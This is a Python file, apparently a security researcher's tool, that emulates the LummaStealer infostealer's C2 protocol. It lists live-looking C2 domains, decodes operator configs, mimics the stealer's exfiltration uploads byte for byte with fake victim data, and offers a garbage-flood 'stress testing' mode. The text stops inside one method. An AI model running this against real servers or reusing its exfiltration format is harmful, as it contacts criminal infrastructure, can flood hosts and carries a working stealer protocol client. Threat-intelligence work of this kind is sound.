#!/usr/bin/env python3
"""
LummaStealer C2 Protocol Emulator
==================================
Fully emulates the LummaStealer C2 communication protocol for:
  - Threat intelligence (connect to live C2 → retrieve operator's target config)
  - Counter-intelligence (feed false stolen data to operator)
  - Stress testing (send large garbage payloads)

Protocol Version: v4 (v6.3+ wire format, ChaCha20 transport)
Reference Sample: de67d471f63e0d2667fb1bd6381ad60465f79a1b8a7ba77f05d8532400178874

Wire Format (PCAP-verified):
  Phase 1: POST uid=<campaign>&cid=                → Receive encrypted config (ChaCha20 JSON)
  Phase 2: POST multipart pid=2 (initial data)     → {"success":...}
  Phase 3: POST multipart pid=3 (browser data)     → {"success":...}
  Phase 4: POST multipart pid=1 (bulk exfil) ×N    → {"success":...}
  Phase 5: POST msg=post|soft|steam|npp|disc|scrn  → {"success":...}
  Phase 6: POST uid=<campaign>&cid=&hwid=<hwid>    → Receive encrypted tasklist
  Phase 7: Follow secondary payload URLs (optional)

DISCLAIMER: This tool is for authorized security research only.
"""

import argparse
import base64
import hashlib
import json
import logging
import os
import random
import secrets
import string
import struct
import sys
import time
import uuid
from dataclasses import dataclass, field
from pathlib import Path
from typing import Optional

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("ERROR: pip install requests", file=sys.stderr)
    sys.exit(1)

try:
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
except ImportError:
    print("ERROR: pip install cryptography", file=sys.stderr)
    sys.exit(1)

# ─── Logging ──────────────────────────────────────────────────────
log = logging.getLogger("lumma-emu")

# ─── Constants ────────────────────────────────────────────────────

# All C2 URLs from analyzed samples (deduplicated, newest first)
# Sample de67d4... (build 92c8cde...): schorlf.cyou + 8 .su domains
# Sample ad0afc... (build deafe1a...): menopjc.cyou + same 8 .su domains
SAMPLE_C2_URLS = [
    "https://menopjc.cyou",           # ad0afc... primary (newer)
    "https://schorlf.cyou",           # de67d4... primary (older)
    "https://whitepepper.su/asds",
    "https://hammernew.su/asdase",
    "https://heavylussy.su/ccvfd",
    "https://broguenko.su/asfase",
    "https://homuncloud.su/ascasef",
    "https://familyriwo.su/fssdaw",
    "https://izzardtow.su/cascasc",
    "https://basilicros.su/asdasq",
]

# Dead Drop Resolver (DDR) URLs
# Steam: Profile name contains ROT-15 encoded C2 domain
# Telegram: Channel title contains ROT-15 encoded C2 domain
STEAM_DDR_URLS = [
    "https://steamcommunity.com/profiles/76561199880317058",
]
# Telegram DDR URL is encoded in PE but was not recovered from memory dump.
# Add manually if known: TELEGRAM_DDR_URLS = ["https://t.me/<channel>"]
TELEGRAM_DDR_URLS = []

USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36"
)

# PCAP-verified header order: Cache-Control → Connection → Pragma → Content-Type → User-Agent → Host
# Content-Length is added automatically by requests library.
# Content-Type is inserted per-request to maintain correct ordering.
def _build_headers(content_type: str, host: str) -> dict:
    """Build headers in exact PCAP-observed order."""
    return {
        "Cache-Control": "no-cache",
        "Connection": "Keep-Alive",
        "Pragma": "no-cache",
        "Content-Type": content_type,
        "User-Agent": USER_AGENT,
        "Host": host,
    }

# Module notification codes in observed PCAP order
MODULE_CODES = ["post", "soft", "steam", "npp", "disc", "scrn"]

# Inner string encoding XOR key (legacy, from PCAP era — Jan 2025)
XOR_KEY_LEGACY = bytes.fromhex("4a26859b552f2a75")


# ─── Crypto ───────────────────────────────────────────────────────
def chacha20_decrypt(data: bytes) -> bytes:
    """Decrypt ChaCha20 envelope: key(32) || nonce(8) || ciphertext."""
    if len(data) < 41:
        raise ValueError(f"Response too short for ChaCha20: {len(data)}B")
    key = data[:32]
    nonce_src = data[32:40]
    ct = data[40:]
    # IETF ChaCha20: 16B nonce = counter(4B LE=0) + pad(4B=0) + nonce_src(8B)
    full_nonce = b'\x00' * 8 + nonce_src
    cipher = Cipher(algorithms.ChaCha20(key, full_nonce), mode=None)
    dec = cipher.decryptor()
    return dec.update(ct) + dec.finalize()


def _is_printable_text(s: str) -> bool:
    """Check if decoded string looks like valid text (ASCII-printable + common chars)."""
    if not s:
        return True
    # Allow printable ASCII, common path separators, Unicode letters in filenames
    printable_count = sum(1 for c in s if 0x20 <= ord(c) < 0x7f or c in '\t\n\r')
    ratio = printable_count / len(s)
    return ratio > 0.85


def decode_lumma_str_b64(b64_str: str) -> str:
    """Decode Base64-wrapped inner encoded string (PCAP-era format).

    Two known Base64 sub-schemes:
      PER-STRING: First 8 bytes of decoded Base64 = XOR key.
        Format: Base64( per_key[8] || XOR(utf16le_data, per_key) )
      GLOBAL: Key 4a26859b552f2a75 applied to entire blob.
        Format: Base64( XOR(per_key[8] || utf16le_data, global_key) )

    Tries per-string key first, falling back to global key.
    """
    raw = base64.b64decode(b64_str)
    if len(raw) < 9:
        return b64_str

    # Attempt 1: Per-string key
    per_key = raw[:8]
    data = raw[8:]
    plaintext = bytes(d ^ per_key[i % 8] for i, d in enumerate(data))
    try:
        decoded = plaintext.decode('utf-16-le').rstrip('\x00')
        if _is_printable_text(decoded):
            return decoded
    except (UnicodeDecodeError, ValueError):
        pass

    # Attempt 2: Global key (legacy PCAP-era scheme)
    decrypted = bytes(b ^ XOR_KEY_LEGACY[i % 8] for i, b in enumerate(raw))
    try:
        decoded = decrypted[8:].decode('utf-16-le').rstrip('\x00')
        if _is_printable_text(decoded):
            return decoded
    except (UnicodeDecodeError, ValueError):
        pass

    # Fallback: return raw b64 string
    return b64_str


def decode_lumma_str_charxor(s: str, key_chars: tuple) -> str:
    """Decode char-level XOR encoded string (live 2025-02+ format).

    The server XORs each plaintext UTF-16 character with a 4-char cycling key,
    then embeds the resulting Unicode characters directly in JSON (no Base64).

    The 4-char key is derived from a per-response 8-byte prefix that appears
    before the JSON in the ChaCha20-decrypted payload, interpreted as 4 UTF-16LE
    values: struct.unpack('<4H', prefix_bytes).

    Args:
        s:         The garbled Unicode string from JSON
        key_chars: Tuple of 4 ints (16-bit XOR key characters)
    Returns:
        Decoded plaintext string
    """
    if not s:
        return s
    key_len = len(key_chars)
    decoded = ''.join(chr(ord(c) ^ key_chars[i % key_len]) for i, c in enumerate(s))
    if _is_printable_text(decoded):
        return decoded
    return s  # Fallback: return as-is if decode looks wrong


# Backwards-compatible wrapper
def decode_lumma_str(b64_str: str) -> str:
    """Decode inner encoded string (Base64 format only). Legacy wrapper."""
    return decode_lumma_str_b64(b64_str)


def decode_value(v, charxor_key=None):
    """Recursively decode all string values in a JSON structure.

    Auto-detects encoding per string:
      1. If charxor_key provided, try char-level XOR first (Format B).
      2. If char-XOR fails or no key, try Base64 + byte-XOR (Format A/C).

    This handles three server formats:
      Format A: JSON at offset 0, Base64-wrapped XOR strings
      Format B: 8-byte key prefix + JSON, char-level XOR strings
      Format C: 8-byte prefix + JSON, but strings still Base64-wrapped
    """
    if isinstance(v, str):
        # Try char-XOR first if key is provided
        if charxor_key:
            try:
                decoded = decode_lumma_str_charxor(v, charxor_key)
                if decoded != v:  # char-XOR succeeded
                    return decoded
            except Exception:
                pass
        # Fall back to Base64 decode (covers Format A and C)
        try:
            return decode_lumma_str_b64(v)
        except Exception:
            return v
    elif isinstance(v, list):
        return [decode_value(i, charxor_key) for i in v]
    elif isinstance(v, dict):
        return {k: decode_value(val, charxor_key) for k, val in v.items()}
    return v


def extract_json(plaintext: bytes):
    """Extract JSON object/array from decrypted plaintext.

    Returns: (parsed_json, json_start_offset)
        json_start_offset indicates where JSON begins in plaintext.
        If > 0, prefix bytes may contain a per-response XOR key.
    """
    text = plaintext.decode('ascii', errors='replace')
    idx_brace = text.find('{')
    idx_bracket = text.find('[')
    candidates = [i for i in (idx_brace, idx_bracket) if i >= 0]
    if not candidates:
        raise ValueError("No JSON found in decrypted response")
    start = min(candidates)
    opener = text[start]
    closer = '}' if opener == '{' else ']'
    depth = 0
    for i in range(start, len(text)):
        if text[i] == opener:
            depth += 1
        elif text[i] == closer:
            depth -= 1
            if depth == 0:
                return json.loads(plaintext[start:i + 1]), start
    raise ValueError("Unterminated JSON")


# ─── Boundary Generator ──────────────────────────────────────────
def generate_boundary() -> str:
    """Generate a realistic multipart boundary matching observed patterns.
    
    Observed: QYKI8CQf12, n4U2Edp0On9S, 124bC6vz0MS3pC9lM9,
              0SzMtvtG3jdbrd4G, QCS1nEUGKpY, 1Q6AY96l7UYE
    Pattern: alphanumeric, 10-18 chars, mixed case + digits.
    """
    length = random.randint(10, 18)
    chars = string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


# ─── HWID Generator ──────────────────────────────────────────────
def generate_hwid() -> str:
    """Generate a realistic hardware ID (32-char uppercase hex, MD5-like).
    
    Real sample: AF02E4AABD24956701AEC7B30ADF174C
    Likely computed from: ComputerName + Username + VolumeSerial + ProcessorID
    """
    seed = f"{uuid.uuid4().hex}-{random.randint(0, 0xFFFFFFFF):08x}"
    return hashlib.md5(seed.encode()).hexdigest().upper()


# ─── Dead Drop Resolver (DDR) ────────────────────────────────────
def rot15_decode(text: str) -> str:
    """Apply ROT-15 Caesar cipher to lowercase letters (a-z only).
    
    This is the exact transform used by LummaStealer to encode C2 domains
    in Steam/Telegram profile names. Non-lowercase chars pass through unchanged.
    
    Note: ROT-15 is NOT self-inverse (only ROT-13 is). The inverse is ROT-11.
    The operator encodes domains with ROT-11 (shift +11) and sets the profile name.
    The malware applies ROT-15 (shift +15) to recover the original domain:
      operator: domain → ROT-11 → profile_name
      malware:  profile_name → ROT-15 → domain  (since 11+15 = 26 ≡ 0 mod 26)
    """
    result = []
    for c in text:
        if 'a' <= c <= 'z':
            result.append(chr((ord(c) - ord('a') + 15) % 26 + ord('a')))
        else:
            result.append(c)
    return ''.join(result)


def resolve_steam_ddr(steam_url: str, timeout: int = 15,
                      proxy: str = None) -> Optional[str]:
    """Resolve C2 domain from Steam Community profile (Dead Drop Resolver).
    
    LummaStealer embeds a ROT-15 encoded C2 domain in the Steam profile
    display name. This function fetches the profile page and extracts it.
    
    Args:
        steam_url: Steam profile URL (e.g. https://steamcommunity.com/profiles/...)
        timeout: HTTP request timeout
        proxy: Optional proxy URL
        
    Returns:
        Decoded C2 domain string, or None if resolution failed
    """
    log.info(f"Steam DDR: Fetching {steam_url}")
    
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml",
        "Accept-Language": "en-US,en;q=0.9",
    }
    
    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"https": proxy, "http": proxy}
        
        resp = session.get(steam_url, headers=headers, timeout=timeout,
                          verify=False)
        
        if resp.status_code != 200:
            log.error(f"Steam DDR: HTTP {resp.status_code}")
            return None
        
        html = resp.text
        
        # Extract persona name: <span class="actual_persona_name">ENCODED_NAME</span>
        START_MARKER = '<span class="actual_persona_name">'
        END_MARKER = '</span>'
        
        start_idx = html.find(START_MARKER)
        if start_idx < 0:
            log.error("Steam DDR: Start marker not found in HTML")
            log.debug(f"Steam DDR: HTML snippet: {html[:500]}")
            return None
        
        start_idx += len(START_MARKER)
        end_idx = html.find(END_MARKER, start_idx)
        if end_idx < 0:
            log.error("Steam DDR: End marker not found")
            return None
        
        encoded_name = html[start_idx:end_idx].strip()
        log.info(f"Steam DDR: Encoded persona name = '{encoded_name}'")
        
        if not encoded_name:
            log.error("Steam DDR: Empty persona name")
            return None
        
        # Apply ROT-15 to decode the C2 domain
        decoded_domain = rot15_decode(encoded_name)
        log.info(f"Steam DDR: Decoded C2 domain = '{decoded_domain}'")
        
        return decoded_domain
        
    except requests.exceptions.RequestException as e:
        log.error(f"Steam DDR: Request failed: {e}")
        return None


def resolve_telegram_ddr(telegram_url: str, timeout: int = 15,
                         proxy: str = None) -> Optional[str]:
    """Resolve C2 domain from Telegram channel page (Dead Drop Resolver).
    
    LummaStealer encodes C2 domain as channel title with ROT-15.
    The title is extracted from: <div class="tgme_page_title" ...><span dir="auto">NAME</span>
    
    Args:
        telegram_url: Telegram channel URL (e.g. https://t.me/channel_name)
        timeout: HTTP request timeout  
        proxy: Optional proxy URL
        
    Returns:
        Decoded C2 domain string, or None if resolution failed
    """
    log.info(f"Telegram DDR: Fetching {telegram_url}")
    
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml",
    }
    
    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"https": proxy, "http": proxy}
        
        resp = session.get(telegram_url, headers=headers, timeout=timeout,
                          verify=False)
        
        if resp.status_code != 200:
            log.error(f"Telegram DDR: HTTP {resp.status_code}")
            return None
        
        html = resp.text
        
        # Extract channel title from Telegram preview page
        # <div class="tgme_page_title" dir="auto">\n  <span dir="auto">ENCODED_NAME</span>
        START_MARKER = '<div class="tgme_page_title"'
        SPAN_MARKER = '<span dir="auto">'
        END_MARKER = '</span>'
        
        start_idx = html.find(START_MARKER)
        if start_idx < 0:
            log.error("Telegram DDR: Page title div not found")
            return None
        
        span_idx = html.find(SPAN_MARKER, start_idx)
        if span_idx < 0:
            log.error("Telegram DDR: Span marker not found")
            return None
        
        span_idx += len(SPAN_MARKER)
        end_idx = html.find(END_MARKER, span_idx)
        if end_idx < 0:
            log.error("Telegram DDR: End marker not found")
            return None
        
        encoded_name = html[span_idx:end_idx].strip()
        log.info(f"Telegram DDR: Encoded channel title = '{encoded_name}'")
        
        if not encoded_name:
            log.error("Telegram DDR: Empty channel title")
            return None
        
        decoded_domain = rot15_decode(encoded_name)
        log.info(f"Telegram DDR: Decoded C2 domain = '{decoded_domain}'")
        
        return decoded_domain
        
    except requests.exceptions.RequestException as e:
        log.error(f"Telegram DDR: Request failed: {e}")
        return None


def resolve_all_ddr(steam_urls: list = None, telegram_urls: list = None,
                    timeout: int = 15, proxy: str = None) -> list:
    """Resolve C2 domains from all known DDR sources.
    
    Returns list of {"source": ..., "url": ..., "encoded": ..., "decoded": ..., "c2_url": ...}
    """
    results = []
    
    for url in (telegram_urls or TELEGRAM_DDR_URLS):
        domain = resolve_telegram_ddr(url, timeout=timeout, proxy=proxy)
        entry = {"source": "telegram", "ddr_url": url, "decoded_domain": domain}
        if domain:
            entry["c2_url"] = f"https://{domain}"
        results.append(entry)
    
    for url in (steam_urls or STEAM_DDR_URLS):
        domain = resolve_steam_ddr(url, timeout=timeout, proxy=proxy)
        entry = {"source": "steam", "ddr_url": url, "decoded_domain": domain}
        if domain:
            entry["c2_url"] = f"https://{domain}"
        results.append(entry)
    
    return results


# ─── Fake Data Generators ────────────────────────────────────────
@dataclass
class FakeIdentity:
    """Configurable fake victim identity for counter-intelligence."""
    computer_name: str = "DESKTOP-A1B2C3D"
    username: str = "JohnDoe"
    windows_version: str = "Windows 10 Pro"
    processor: str = "Intel(R) Core(TM) i7-10700 CPU @ 2.90GHz"
    ram_gb: int = 16
    display_resolution: str = "1920x1080"
    language: str = "en-US"
    timezone: str = "UTC-05:00"
    installed_av: str = "Windows Defender"
    ip_address: str = "203.0.113.42"


class FakeDataGenerator:
    """Generates realistic-looking but fake stolen data for each pid type."""

    def __init__(self, identity: Optional[FakeIdentity] = None,
                 garbage_size_mb: float = 0):
        self.identity = identity or FakeIdentity()
        self.garbage_size_mb = garbage_size_mb

    def generate_pid2_data(self) -> bytes:
        """pid=2: System/browser profile info (first upload, ~12KB).
        
        Contains system info + browser profile metadata.
        """
        sysinfo = {
            "computer_name": self.identity.computer_name,
            "username": self.identity.username,
            "os": self.identity.windows_version,
            "cpu": self.identity.processor,
            "ram": f"{self.identity.ram_gb} GB",
            "display": self.identity.display_resolution,
            "language": self.identity.language,
            "timezone": self.identity.timezone,
            "av": self.identity.installed_av,
            "ip": self.identity.ip_address,
            "hwid": "",  # will be filled by caller
        }

        # Generate fake browser profile list
        profiles = []
        browsers = [
            ("Google Chrome", "Default", "C:\\Users\\{user}\\AppData\\Local\\Google\\Chrome\\User Data"),
            ("Microsoft Edge", "Default", "C:\\Users\\{user}\\AppData\\Local\\Microsoft\\Edge\\User Data"),
        ]
        for name, profile, path in browsers:
            profiles.append({
                "browser": name,
                "profile": profile,
                "path": path.format(user=self.identity.username),
            })

        data = json.dumps({"system": sysinfo, "profiles": profiles}, indent=2).encode('utf-8')

        if self.garbage_size_mb > 0:
            target = int(self.garbage_size_mb * 1024 * 1024)
            data += b'\x00' * (target - len(data))

        return data

    def generate_pid3_data(self) -> bytes:
        """pid=3: Browser collected data (cookies/passwords, ~17KB).
        
        Generates realistic-looking but completely fake credential entries.
        """
        fake_creds = []
        fake_domains = [
            "accounts.google.com", "login.microsoftonline.com",
            "www.facebook.com", "twitter.com", "github.com",
            "mail.yahoo.com", "outlook.live.com", "amazon.com",
            "netflix.com", "paypal.com", "linkedin.com",
        ]

        for domain in fake_domains:
            fake_creds.append({
                "url": f"https://{domain}/",
                "username": f"{self.identity.username.lower()}@example.com",
                "password": f"FakePass_{secrets.token_hex(8)}",
                "browser": "Google Chrome",
                "profile": "Default",
            })

        # Add fake cookies
        fake_cookies = []
        for domain in fake_domains[:5]:
            fake_cookies.append({
                "domain": domain,
                "name": "session_id",
                "value": secrets.token_hex(16),
                "path": "/",
                "expires": "2026-12-31",
                "httpOnly": True,
                "secure": True,
            })

        data = json.dumps({
            "passwords": fake_creds,
            "cookies": fake_cookies,
            "autofill": [],
            "credit_cards": [],
        }, indent=2).encode('utf-8')

        if self.garbage_size_mb > 0:
            target = int(self.garbage_size_mb * 1024 * 1024)
            data += b'\x00' * (target - len(data))

        return data

    def generate_pid1_data(self, chunk_index: int = 0) -> bytes:
        """pid=1: Bulk exfil data (wallet files, screenshots, etc.)
        
        Multiple chunks sent. In the PCAP: 209KB, 1.3KB, 380KB, 955B.
        """
        if chunk_index == 0:
            # Fake wallet data
            wallet_data = {
                "wallets": [
                    {
                        "type": "Ethereum",
                        "path": f"C:\\Users\\{self.identity.username}\\AppData\\Roaming\\Ethereum\\keystore",
                        "files": [
                            {"name": f"UTC--2024-01-15T10-30-00.000Z--{secrets.token_hex(20)}",
                             "content": base64.b64encode(json.dumps({
                                "version": 3,
                                "id": str(uuid.uuid4()),
                                "address": secrets.token_hex(20),
                                "crypto": {
                                    "cipher": "aes-128-ctr",
                                    "ciphertext": secrets.token_hex(32),
                                    "cipherparams": {"iv": secrets.token_hex(16)},
                                    "kdf": "scrypt",
                                    "mac": secrets.token_hex(32),
                                }
                             }).encode()).decode()}
                        ],
                    },
                ],
                "extensions": [],
            }
            data = json.dumps(wallet_data, indent=2).encode('utf-8')
        elif chunk_index == 1:
            # Fake screenshot (small PNG header + garbage)
            # Minimal valid PNG: 8-byte signature + IHDR chunk
            png_sig = b'\x89PNG\r\n\x1a\n'
            ihdr = struct.pack('>I', 13) + b'IHDR'
            ihdr += struct.pack('>II', 1920, 1080)  # width, height
            ihdr += b'\x08\x02\x00\x00\x00'  # 8bit RGB
            # CRC placeholder
            import zlib
            ihdr += struct.pack('>I', zlib.crc32(ihdr[4:]) & 0xFFFFFFFF)
            data = png_sig + ihdr + os.urandom(380000)  # ~380KB like PCAP
        else:
            # Additional data chunks
            data = json.dumps({
                "installed_software": [
                    {"name": "Google Chrome", "version": "120.0.6099.130"},
                    {"name": "Microsoft Office", "version": "16.0.17328.20162"},
                    {"name": "Steam", "version": "2.10.91.92"},
                    {"name": "Discord", "version": "1.0.9030"},
                    {"name": "Notepad++", "version": "8.6.2"},
                    {"name": "7-Zip", "version": "23.01"},
                    {"name": "VLC media player", "version": "3.0.20"},
                ],
                "running_processes": [
                    "chrome.exe", "explorer.exe", "svchost.exe",
                    "taskmgr.exe", "discord.exe", "steam.exe",
                ],
            }, indent=2).encode('utf-8')

        if self.garbage_size_mb > 0:
            target = int(self.garbage_size_mb * 1024 * 1024)
            if len(data) < target:
                data += os.urandom(target - len(data))

        return data

    def generate_garbage_payload(self, size_mb: float) -> bytes:
        """Generate a pure garbage payload of specified size."""
        return os.urandom(int(size_mb * 1024 * 1024))


# ─── C2 Emulator Client ──────────────────────────────────────────
@dataclass
class C2Config:
    """Decoded C2 configuration from server response."""
    version: int = 0
    stealer_enabled: bool = False
    ad_inject: bool = False
    vm_check: bool = False
    extensions: list = field(default_factory=list)
    mail_targets: list = field(default_factory=list)
    credential_paths: list = field(default_factory=list)
    raw_json: dict = field(default_factory=dict)


@dataclass
class C2TaskList:
    """Decoded task list from second C2 response."""
    tasks: list = field(default_factory=list)
    raw_json: list = field(default_factory=list)


class LummaC2Emulator:
    """Full LummaStealer C2 protocol emulator.
    
    Implements the exact wire format observed in behavioral1.pcapng.
    Header order, content types, and multipart formatting match
    the real malware byte-for-byte.
    """

    def __init__(self, c2_url: str, uid: str, hwid: str = None,
                 verify_ssl: bool = False, timeout: int = 30,
                 proxy: str = None, dry_run: bool = False,
                 max_retries: int = 3):
        """
        Args:
            c2_url:     C2 server URL (e.g., "https://schorlf.cyou/")
            uid:        Campaign ID (from PE .data section)
            hwid:       Hardware ID (32-char hex). Auto-generated if None.
            verify_ssl: Verify TLS certificates
            timeout:    Request timeout in seconds
            proxy:      SOCKS/HTTP proxy URL for operational security
            dry_run:    If True, print requests without sending
        """
        self.c2_url = c2_url.rstrip('/') + '/'
        self._host = self.c2_url.split("//")[1].split("/")[0]
        self.uid = uid
        self.hwid = hwid or generate_hwid()
        self.verify_ssl = verify_ssl
        self.timeout = timeout
        self.dry_run = dry_run
        self.config: Optional[C2Config] = None
        self.tasks: Optional[C2TaskList] = None

        # Setup session with retry logic
        self.session = requests.Session()
        if proxy:
            self.session.proxies = {"https": proxy, "http": proxy}
        retry = Retry(total=max_retries, backoff_factor=1,
                      status_forcelist=[500, 502, 503, 504])
        self.session.mount("https://", HTTPAdapter(max_retries=retry))
        self.session.mount("http://", HTTPAdapter(max_retries=retry))

        log.info(f"C2 URL: {self.c2_url}")
        log.info(f"UID (Campaign): {self.uid}")
        log.info(f"HWID: {self.hwid}")

    # ── HTTP Primitives ──────────────────────────────────────────

    def _post_urlencoded(self, data: str) -> Optional[bytes]:
        """Send application/x-www-form-urlencoded POST (check-in / status)."""
        headers = _build_headers("application/x-www-form-urlencoded", self._host)
        log.debug(f"POST urlencoded ({len(data)}B): {data[:100]}")

        if self.dry_run:
            log.info(f"[DRY-RUN] POST {self.c2_url}")
            log.info(f"  Headers: {headers}")
            log.info(f"  Body: {data}")
            return None

        try:
            resp = self.session.post(
                self.c2_url,
                data=data.encode('ascii'),
                headers=headers,
                verify=self.verify_ssl,
                timeout=self.timeout,
            )
            log.info(f"Response: {resp.status_code} {resp.headers.get('Content-Type', '?')} "
                     f"({len(resp.content)}B)")
            return resp.content
        except requests.exceptions.ReadTimeout:
            log.error(f"Timeout connecting to {self.c2_url} (TLS handshake or read timeout)")
            return None
        except requests.exceptions.ConnectionError as e:
            log.error(f"Connection failed to {self.c2_url}: {e}")
            return None
        except requests.exceptions.RequestException as e:
            log.error(f"Request failed: {e}")
            return None

    def _post_multipart(self, uid: str, pid: int, hwid: str,
                        file_data: bytes) -> Optional[bytes]:
        """Send multipart/form-data POST (data exfiltration).
        
        Builds the multipart body manually to match exact wire format:
        - Parts order: uid → pid → hwid → file
        - File field: name="file", filename="data"
        - File content-type: application/octet-stream
        """
        boundary = generate_boundary()

        # Build multipart body manually (matching PCAP exactly)
        parts = []
        for name, value in [("uid", uid), ("pid", str(pid)), ("hwid", hwid)]:
            parts.append(
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n'
                f"\r\n"
                f"{value}"
            )
        # File part
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="data"\r\n'
            f"Content-Type: application/octet-stream\r\n"
            f"\r\n"
        )

        # Assemble body
        body = "\r\n".join(parts).encode('ascii') + file_data + f"\r\n--{boundary}--\r\n".encode('ascii')

        headers = _build_headers(
            f"multipart/form-data; boundary={boundary}", self._host)

        log.debug(f"POST multipart pid={pid} ({len(body)}B, boundary={boundary})")

        if self.dry_run:
            log.info(f"[DRY-RUN] POST multipart pid={pid} ({len(body)}B)")
            log.info(f"  file_data size: {len(file_data)}B")
            return None

        try:
            resp = self.session.post(
                self.c2_url,
                data=body,
                headers=headers,
                verify=self.verify_ssl,
                timeout=self.timeout,
            )
            log.info(f"Multipart pid={pid}: {resp.status_code} ({len(resp.content)}B)")
            return resp.content
        except requests.exceptions.ReadTimeout:
            log.error(f"Timeout on multipart pid={pid} to {self.c2_url}")
            return None
        except requests.exceptions.ConnectionError as e:
            log.error(f"Connection failed on multipart pid={pid}: {e}")
            return None
        except requests.exceptions.RequestException as e:
            log.error(f"Request failed on multipart pid={pid}: {e}")
            return None

    # ── Protocol Phases ──────────────────────────────────────────

    def phase1_checkin(self) -> Optional[bytes]:
        """Phase 1: Initial check-in. Returns raw encrypted response."""
        log.info("=" * 60)
        log.info("Phase 1: Initial check-in")
        data = f"uid={self.uid}&cid="
        return self._post_urlencoded(data)

    def phase2_receive_config(self, raw_response: bytes) -> C2Config:
        """Phase 2: Decrypt and parse tasking configuration.

        Auto-detects string encoding format:
          - PCAP era (2025-01): JSON at offset 0, strings are Base64-wrapped XOR.
          - Live era (2025-02+): 8-byte XOR key prefix before JSON, strings are
            char-level XOR encoded as Unicode in JSON (no Base64).
        """
        log.info("=" * 60)
        log.info("Phase 2: Decrypting tasking config")

        plaintext = chacha20_decrypt(raw_response)
        raw_config, json_offset = extract_json(plaintext)

        # Detect encoding format from JSON start offset
        charxor_key = None
        if json_offset >= 8:
            # Live format: prefix bytes contain 4-char XOR key (8 bytes, UTF-16LE)
            key_bytes = plaintext[:8]
            charxor_key = struct.unpack('<4H', key_bytes)
            log.info(f"Detected char-XOR key prefix at offset 0-7: {key_bytes.hex()} "
                     f"(chars: [{', '.join(f'0x{k:04x}' for k in charxor_key)}])")
        else:
            log.info(f"No key prefix (JSON at offset {json_offset}), using Base64 decode")

        config = C2Config()
        if isinstance(raw_config, dict):
            config.version = raw_config.get("v", 0)
            config.stealer_enabled = raw_config.get("se", False)
            config.ad_inject = raw_config.get("ad", False)
            config.vm_check = raw_config.get("vm", False)
            config.extensions = raw_config.get("ex", [])
            config.mail_targets = raw_config.get("mx", [])
            config.credential_paths = raw_config.get("c", [])
            config.raw_json = raw_config

            # Decode all strings (auto-selects method based on detected format)
            decoded = decode_value(raw_config, charxor_key=charxor_key)
            log.info(f"Config v{config.version}: "
                     f"se={config.stealer_enabled} ad={config.ad_inject} vm={config.vm_check}")
            log.info(f"Extensions: {len(config.extensions)}, "
                     f"Mail: {len(config.mail_targets)}, "
                     f"Cred paths: {len(config.credential_paths)}")
            config.raw_json = decoded

        self.config = config
        return config

    def phase3_exfil(self, pid: int, data: bytes) -> Optional[bytes]:
        """Phase 3: Send stolen data via multipart upload."""
        log.info(f"Phase 3: Exfil data (pid={pid}, {len(data)}B)")
        return self._post_multipart(self.uid, pid, self.hwid, data)

    def phase4_notify(self, module_code: str) -> Optional[bytes]:
        """Phase 4: Send module completion notification."""
        log.info(f"Phase 4: Notify module '{module_code}'")
        data = f"uid={self.uid}&hwid={self.hwid}&msg={module_code}"
        return self._post_urlencoded(data)

    def phase5_second_checkin(self) -> Optional[bytes]:
        """Phase 5: Second check-in (with HWID). Returns raw encrypted response."""
        log.info("=" * 60)
        log.info("Phase 5: Second check-in (with HWID)")
        data = f"uid={self.uid}&cid=&hwid={self.hwid}"
        return self._post_urlencoded(data)

    def phase6_receive_tasks(self, raw_response: bytes) -> C2TaskList:
        """Phase 6: Decrypt and parse task list.
        
        Note: C2 may return plaintext JSON error if no tasks are assigned.
        Example: {"error":{"error_code":1,"error_msg":"data not found"}}
        In that case, skip ChaCha20 decryption.
        """
        log.info("=" * 60)
        log.info("Phase 6: Decrypting task list")

        # Try plaintext JSON first (error responses are not encrypted)
        try:
            raw_text = raw_response.decode('ascii', errors='strict')
            raw_tasks = json.loads(raw_text)
            if isinstance(raw_tasks, dict) and "error" in raw_tasks:
                err = raw_tasks["error"]
                log.warning(f"C2 returned error (plaintext): code={err.get('error_code')}, "
                           f"msg={err.get('error_msg')}")
                tasklist = C2TaskList()
                tasklist.raw_json = [raw_tasks]
                self.tasks = tasklist
                return tasklist
        except (UnicodeDecodeError, json.JSONDecodeError, ValueError):
            pass

        # Encrypted response — decrypt with ChaCha20
        plaintext = chacha20_decrypt(raw_response)
        raw_tasks, _offset = extract_json(plaintext)

        tasklist = C2TaskList()
        if isinstance(raw_tasks, list):
            tasklist.tasks = raw_tasks
            tasklist.raw_json = raw_tasks
            for i, task in enumerate(raw_tasks):
                url = task.get("u", "?")
                ft = task.get("ft", "?")
                enabled = task.get("e", 0)
                log.info(f"  Task {i}: url={url} ft={ft} enabled={enabled}")
        elif isinstance(raw_tasks, dict):
            tasklist.raw_json = [raw_tasks]

        self.tasks = tasklist
        return tasklist

    # ── Full Protocol Run ────────────────────────────────────────

    def run_intel_only(self) -> dict:
        """INTEL mode: Check in, receive config, and disconnect.
        
        No data is sent. Only retrieves the operator's targeting config.
        Returns the decoded config.
        """
        log.info("=" * 60)
        log.info("MODE: Intelligence gathering (read-only)")
        log.info("=" * 60)

        results = {"mode": "intel", "c2_url": self.c2_url, "uid": self.uid,
                   "hwid": self.hwid, "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime())}

        # Phase 1+2: Get config
        raw = self.phase1_checkin()
        if raw is None:
            log.warning("No response from C2 (dry-run or connection failed)")
            return results

        results["response1_size"] = len(raw)
        results["response1_hex"] = raw.hex()

        try:
            config = self.phase2_receive_config(raw)
            results["config"] = config.raw_json
            results["config_version"] = config.version
            results["extensions_count"] = len(config.extensions)
            results["credential_paths_count"] = len(config.credential_paths)
            results["mail_targets_count"] = len(config.mail_targets)
        except Exception as e:
            log.error(f"Failed to decrypt config: {e}")
